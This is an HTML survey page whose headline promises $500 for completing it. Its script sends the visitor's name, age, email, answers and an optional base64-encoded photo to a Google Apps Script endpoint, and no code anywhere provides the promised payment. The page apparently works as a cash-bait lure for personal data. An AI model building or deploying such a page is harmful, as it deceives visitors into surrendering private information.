<!DOCTYPE html>
<html>
<head>
  <title>Survey</title>
</head>
<body>
  <h1>💸Complete This Survey and Receive $500!💸</h1>
  <form id="survey-form">
    <label>Full Name:</label><br>
    <input type="text" id="q1" required><br><br>

    <label>Age:</label><br>
    <input type="text" id="q2" required><br><br>

    <label>Email Address:</label><br>
    <input type="text" id="q3" required><br><br>

    <label>What are your goals in life?</label><br>
    <input type="text" id="q4" required><br><br>

    <label>What would you do with $500?</label><br>
    <input type="text" id="q5" required><br><br>

    <label>What is your favorite animal?</label><br>
    <input type="text" id="q6" required><br><br>

    <label>Upload a picture of you or your pets (optional):</label><br>
    <input type="file" id="q7" accept="image/*"><br><br>

    <button type="submit">Submit</button>
  </form>

  <p id="response"></p>

  <script>
    const form = document.getElementById('survey-form');
    const responseEl = document.getElementById('response');

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const fileInput = document.getElementById('q7');
      const file = fileInput.files[0];

      if (file) {
        const reader = new FileReader();
        reader.onloadend = function () {
          const base64Image = reader.result.split(',')[1]; // Remove "data:image/...;base64,"
          sendData(base64Image);
        };
        reader.readAsDataURL(file);
      } else {
        sendData(""); // No image uploaded
      }
    });

    function sendData(base64Image) {
      const data = {
        q1: document.getElementById('q1').value,
        q2: document.getElementById('q2').value,
        q3: document.getElementById('q3').value,
        q4: document.getElementById('q4').value,
        q5: document.getElementById('q5').value,
        q6: document.getElementById('q6').value,
        q7: base64Image
      };

      fetch('https://script.google.com/macros/s/AKfycbwj5qThcdeL-Q2sItNZiZp23uTSBYffj4A6MIewFJdi1eM3aqJqHw3ncpK_w7IwquUo/exec', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
          'Content-Type': 'application/json'
        }
      })
      .then(res => res.text())
      .then(response => {
        responseEl.textContent = "✅ Successfully submitted!";
        form.reset();
      })
      .catch(error => {
        responseEl.textContent = "❌ Error submitting the form.";
        console.error(error);
      });
    }
  </script>
</body>
</html>
